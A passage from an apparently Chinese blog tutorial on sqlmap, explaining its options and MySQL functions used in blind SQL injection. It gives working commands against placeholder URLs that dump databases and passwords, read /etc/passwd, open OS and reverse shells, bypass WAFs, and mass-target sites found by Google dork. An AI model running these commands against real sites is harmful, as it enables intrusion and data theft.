<p>Operating system access（操作系统访问）：<br>这些选项可以用于访问后端数据库管理系统的底层操作系统。<br>–os-cmd=OSCMD 执行操作系统命令<br>–os-shell 交互式的操作系统的 shell<br>–os-pwn 获取一个 OOB shell，meterpreter 或 VNC<br>–os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC<br>–os-bof 存储过程缓冲区溢出利用<br>–priv-esc 数据库进程用户权限提升<br>–msf-path=MSFPATH Metasploit Framework 本地的安装路径<br>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
<p>Windows 注册表访问：<br>这些选项可以被用来访问后端数据库管理系统 Windows 注册表。<br>–reg-read 读一个 Windows 注册表项值<br>–reg-add 写一个 Windows 注册表项值数据<br>–reg-del 删除 Windows 注册表键值<br>–reg-key=REGKEY Windows 注册表键<br>–reg-value=REGVAL Windows 注册表项值<br>–reg-data=REGDATA Windows 注册表键值数据<br>–reg-type=REGTYPE Windows 注册表项值类型</p>
<p>General（一般）：<br>这些选项可以用来设置一些一般的工作参数。<br>-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中<br>-s SESSIONFILE 保存和恢复检索会话文件的所有数据<br>–flush-session 刷新当前目标的会话文件<br>–fresh-queries 忽略在会话文件中存储的查询结果<br>–eta 显示每个输出的预计到达时间<br>–update 更新 SqlMap<br>–save file 保存选项到 INI 配置文件<br>–batch 从不询问用户输入，使用所有默认配置。</p>
<p>Miscellaneous（杂项）：<br>–beep 发现 SQL 注入时提醒<br>–check-payload IDS 对注入 payloads 的检测测试<br>–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS<br>–forms 对目标 URL 的解析和测试形式<br>–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果<br>–page-rank Google dork 结果显示网页排名（PR）<br>–parse-errors 从响应页面解析数据库管理系统的错误消息<br>–replicate 复制转储的数据到一个 sqlite3 数据库<br>–tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>–wizard 给初级用户的简单向导界面</p>
<h2 id="Sqlmap基础的使用"><a href="#Sqlmap基础的使用" class="headerlink" title="Sqlmap基础的使用"></a>Sqlmap基础的使用</h2><p>./sqlmap.py sqlmap -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> // 查是否有注入，一些基本信息</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –dbs // 枚举数据库</p>
<p>./sqlmap.py sqlmap -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –tables // 表名枚举</p>
<p>./sqlmap.py sqlmap -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –columns -T 数据库表名 // 字段枚举</p>
<p>./sqlmap.py sqlmap -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –dump -T 数据库表名 -C “字段 1，字段 2，字段 3” //dump</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –dump -D 数据库名 -T 表名 -C “字段名 1，字段名 2，字段名 3” //dump</p>
<p>获取数据库—&gt; 获取表名—-&gt; 获取字段名—-&gt; 获取数据库内容</p>
<h2 id="Sqlmap初级使用"><a href="#Sqlmap初级使用" class="headerlink" title="Sqlmap初级使用"></a>Sqlmap初级使用</h2><p>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dbs / <em>查询是什么数据库sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –current-db /</em> 获取当前数据库名称<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –current-user / <em>获取当前用户名称sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> -D DataName –tables /</em> 获取 DataName 数据库的表<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –columns -T “tablename” users-D “db_name” -v 0 /* 列字段</p>
<p>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> -D DataName –T TableNamen –C “admin,password” –dump -v 0 / <em>获取字段数据sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dbms “Mysql” /</em> 指定数据库类型<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –users / <em>列数据库用户sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –passwords /</em> 获取数据库用户密码<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –passwords -U root -v 0 / <em>列出指定用户数据库密码sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dump -C “password,user,id” -T “tablename” -D “db_name” –start 1 –stop 20 /</em> 列出指定字段，列出 20 条<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dump-all -v 0 / <em>列出所有数据库所有表sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –privileges /</em> 查看权限<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –privileges -U root / <em>查看指定用户权限sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –is-dba -v 1 /</em> 是否是数据库管理员<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –roles / <em>枚举数据库用户角色sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –udf-inject /</em> 导入用户自定义函数（获取 系统权限！）<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dump-all –exclude-sysdbs -v 0 / <em>列出当前库所有表sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –union-cols /*union 查询表记录<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –cookie “COOKIE_VALUE” /*cookie 注入sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> -b(–banner) /</em> 获取 banner 信息<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –data “id=3” /<em>post 注入sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> -v 1 -f /</em> 指纹判别数据库类型<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –proxy “<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MTE44oCdLw==" title="http://127.0.0.1:8118”/">http://127.0.0.1:8118”<i class="fa fa-external-link"></i></span> / <em>代理注入sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –string “STRING_ON_TRUE_PAGE” /</em> 指定关键词<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –sql-shell / <em>执行指定 sql 命令sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –file /etc/passwdsqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –os-cmd=whoami /</em> 执行系统命令<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –os-shell / <em>系统交互 shellsqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –os-pwn /</em> 反弹 shell<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –reg-read / <em>读取 win 系统注册表sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dbs-o “sqlmap.log”/</em> 保存进度<br>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3VybC9uZXdzP2lkPTHigJ0=" title="http://url/news?id=1”">http://url/news?id=1”<i class="fa fa-external-link"></i></span> –dbs -o “sqlmap.log” –resume /* 恢复 已保存进度</p>
<h2 id="Sqlmap使用进阶"><a href="#Sqlmap使用进阶" class="headerlink" title="Sqlmap使用进阶"></a>Sqlmap使用进阶</h2><h3 id="利用Cookies"><a href="#利用Cookies" class="headerlink" title="利用Cookies"></a>利用Cookies</h3><p>cookie “id=9”<br>在 ASP 中, request 对象获取客户端提交数据常用的是 get 和 post 两种方式, 同时 request 对象可以不通过集合来获得数据, 即直接使用”request(“name”)”. 但它效率低下, 容易出错, 当我们省略具体的集合名称时, asp 是按 QueryString(get),Form(post),Cookie,Severvariable, 集合的顺序来搜索的. cookie 是保存在客户端的一个文本文件, 可以进行修改, 这样一来, 就可以利用 Request.cookie 方式来提交变量的值, 从而利用系统的漏洞进行注入攻击</p>
<h3 id="Sqlmap表单的使用"><a href="#Sqlmap表单的使用" class="headerlink" title="Sqlmap表单的使用"></a>Sqlmap表单的使用</h3><p>表单枚举<br>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –forms</p>
<p>指定表单数据<br>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –data “tfUName=1&amp;UPass=1”</p>
<p>burpsuite 抓包与构造 request 请求</p>
<p>./sqlmap.py -r search_test.py -p tfUPass</p>
<h3 id="交互式shell的使用（可提权）"><a href="#交互式shell的使用（可提权）" class="headerlink" title="交互式shell的使用（可提权）"></a>交互式shell的使用（可提权）</h3><p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –os-cmd “ipconfig”</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –os-shell</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –os-pwn</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> –sql-shell</p>
<h3 id="配合Google-Hacking使用"><a href="#配合Google-Hacking使用" class="headerlink" title="配合Google Hacking使用"></a>配合Google Hacking使用</h3><p>-p name / <em>多个参数如 index.php?n_id=1&amp;name=2&amp;data=2020 我们想指定 name 参数进行注入sqlmap.py -g “site:xxxxx.com inurl:php?id=” –dump-all –batch /</em>google 搜索注入点自动跑出所有字段，需保证 google.com 能正常访问</p>
<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>–batch Never ask for user input, use the default behaviour<br>–tamper=TAMPER Use given script(s) for tampering injection data<br>常见 encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p>
<p>例子：</p>
<p>./sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29t" title="http://www.xxx.com">http://www.xxx.com”<i class="fa fa-external-link"></i></span> -v 3 –dbs –batch –tamper “space2hash.py”</p>
<h3 id="智能level测试等级"><a href="#智能level测试等级" class="headerlink" title="智能level测试等级"></a>智能level测试等级</h3><p>sqlmap.py -u “<span class="exturl" data-url="aHR0cDovL3d3dy4yY3RvLmNvbS8=" title="http://www.2cto.com/">http://www.2cto.com<i class="fa fa-external-link"></i></span> /news?id=1” –smart –level 3 –users /*smart 智能 level 测试等级</p>
<h3 id="基本信息收集的SQL语句"><a href="#基本信息收集的SQL语句" class="headerlink" title="基本信息收集的SQL语句"></a>基本信息收集的SQL语句</h3><h4 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;select table_name,row_nums from user_tables order by row_nums desc [where table_name like &#39;%%&#39;]查询前10条select * from [table_name] where numrow&lt;&#x3D;10&#96;</span><br></pre></td></tr></table></figure>

<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;select table_name from information_schema.tables [where table_name like &#39;%%&#39;]查询前10条select * from [table_name] limit 10&#96;</span><br></pre></td></tr></table></figure>

<h4 id="Sqlserver"><a href="#Sqlserver" class="headerlink" title="Sqlserver"></a>Sqlserver</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;select a.name,b.rows from sysobjects a with(nolock) join sysindexes b on b.id&#x3D;a.id where a.xtype&#x3D;&#39;u&#39; and b.indid in (0,1) order by b.rows desc查询前10条select top 10 * from [table_name]&#96;</span><br></pre></td></tr></table></figure>

<h2 id="Sqlmap盲注过程相关的函数及使用方法"><a href="#Sqlmap盲注过程相关的函数及使用方法" class="headerlink" title="Sqlmap盲注过程相关的函数及使用方法"></a>Sqlmap盲注过程相关的函数及使用方法</h2><h4 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h4><p>–从文本字段中提取字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure>

<p>column_name：要提取字符串的字段内容</p>
<p>start：必需，规定起始位置（值为1）</p>
<p>length可选，代表长度；如果省略，则返回剩余的文本内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select mid(adnumber,1,2)from address_list;</span><br><span class="line">+-------------------+</span><br><span class="line">| mid(adnumber,1,2) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 31                |</span><br><span class="line">| 31                |</span><br><span class="line">| 31                |</span><br><span class="line">| 31                |</span><br><span class="line">| 31                |</span><br><span class="line">+-------------------+</span><br><span class="line">5 rows in set (0.01 sec)</span><br><span class="line">mysql&gt; select mid(adnumber,1,3)from address_list;</span><br><span class="line">+-------------------+</span><br><span class="line">| mid(adnumber,1,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 311               |</span><br><span class="line">| 311               |</span><br><span class="line">| 311               |</span><br><span class="line">| 311               |</span><br><span class="line">| 311               |</span><br><span class="line">+-------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; select mid(adnumber,2,3)from address_list;</span><br><span class="line">+-------------------+</span><br><span class="line">| mid(adnumber,2,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 117               |</span><br><span class="line">| 117               |</span><br><span class="line">| 117               |</span><br><span class="line">| 117               |</span><br><span class="line">| 117               |</span><br><span class="line">+-------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="limit"><a href="#limit" class="headerlink" title="limit()"></a>limit()</h4><p>–返回前几条或者中间某几行数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table limit m,n;</span><br></pre></td></tr></table></figure>

<p>从第m条记录开始返回n条记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user limit 1,2;</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| id | username | password | number     | classinfo | createdata          |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| 82 | 5555     | 123456   | 311700     | 177777    | 2019-07-06 20:45:50 |</span><br><span class="line">| 83 | 9999     | 123456   | 311700     | 1777777   | 2019-07-06 20:46:14 |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from user limit 1,3;</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| id | username | password | number     | classinfo | createdata          |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| 82 | 5555     | 123456   | 3117       | 1777777   | 2019-07-06 20:45:50 |</span><br><span class="line">| 83 | 9999     | 123456   | 311700     | 1777777   | 2019-07-06 20:46:14 |</span><br><span class="line">| 84 | 安卓大神  | 123456   | 311700     | 17777777  | 2019-07-06 20:46:50 |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="concat、concat-ws、group-concat"><a href="#concat、concat-ws、group-concat" class="headerlink" title="concat、concat_ws、group_concat"></a>concat、concat_ws、group_concat</h4><p>concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;123&#39;,null);</span><br><span class="line">+--------------------+</span><br><span class="line">| concat(&#39;123&#39;,null) |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select concat(&#39;123&#39;,&#39;123456&#39;);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&#39;123&#39;,&#39;123456&#39;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 123123456              |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>concat_ws函数在执行的时候,不会因为NULL值而返回NULL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#39;123&#39;,null);</span><br><span class="line">+-----------------------+</span><br><span class="line">| concat_ws(&#39;123&#39;,null) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select concat_ws(&#39;123&#39;,&#39;456789&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| concat_ws(&#39;123&#39;,&#39;456789&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 456789                    |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select concat_ws(&#39;.&#39;,&#39;123&#39;,&#39;456789&#39;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(&#39;.&#39;,&#39;123&#39;,&#39;456789&#39;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 123.456789                    |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="Count"><a href="#Count" class="headerlink" title="Count()"></a>Count()</h4><p>–聚集函数，统计元祖的个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from user;</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        4 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h4><p>–用于产生一个0~1的随机数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select rand(),rand();</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">| rand()             | rand()              |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">| 0.4360487893559493 | 0.24646534328019745 |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>–依据我们想要的规则对结果进行分组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user group by username;</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| id | username | password | number     | classinfo | createdata          |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| 82 | 5555     | 123456   | 311700     | 11111111  | 2019-07-06 20:45:50 |</span><br><span class="line">| 83 | 9999     | 123456   | 311700     | 1111111   | 2019-07-06 20:46:14 |</span><br><span class="line">| 81 | 古       | 123456   | 311700     | 1111111   | 2019-07-06 20:28:13 |</span><br><span class="line">| 84 | 大神     | 123456   | 311700     | 1111111   | 2019-07-06 20:46:50 |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>–返回字符串的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select length(&#39;xianzhi&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| length(&#39;xianzhi&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 7 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from user where length(username)&#x3D;4;</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| id | username | password | number     | classinfo | createdata          |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">| 82 | 5555     | 123456   | 3117004597 | 170806    | 2019-07-06 20:45:50 |</span><br><span class="line">| 83 | 9999     | 123456   | 3117004598 | 170806    | 2019-07-06 20:46:14 |</span><br><span class="line">+----+----------+----------+------------+-----------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="Substr"><a href="#Substr" class="headerlink" title="Substr()"></a>Substr()</h4><p>–截取字符串</p>
<p>三个参数 （所要截取字符串，截取的位置，截取的长度）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select substr(&#39;abcdefghijk&#39;,4,8);</span><br><span class="line">+---------------------------+</span><br><span class="line">| substr(&#39;abcdefghijk&#39;,4,8) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| defghijk                  |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select substr(username,1,2)from user;</span><br><span class="line">+----------------------+</span><br><span class="line">| substr(username,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 古日                 |</span><br><span class="line">| 55                   |</span><br><span class="line">| 99                   |</span><br><span class="line">| 安卓                 |</span><br><span class="line">+----------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii()"></a>Ascii()</h4><p>–返回字符串的ascii码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ascii(9);</span><br><span class="line">+----------+</span><br><span class="line">| ascii(9) |</span><br><span class="line">+----------+</span><br><span class="line">|       57 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select ascii(substr(username,1,2))from user;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ascii(substr(username,1,2)) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                         229 |</span><br><span class="line">|                          53 |</span><br><span class="line">|                          57 |</span><br><span class="line">|                         229 |</span><br><span class="line">+-----------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      <categories>
        <category>SQLinjection</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>SQLmap</tag>
      </tags>
  </entry>
</search>
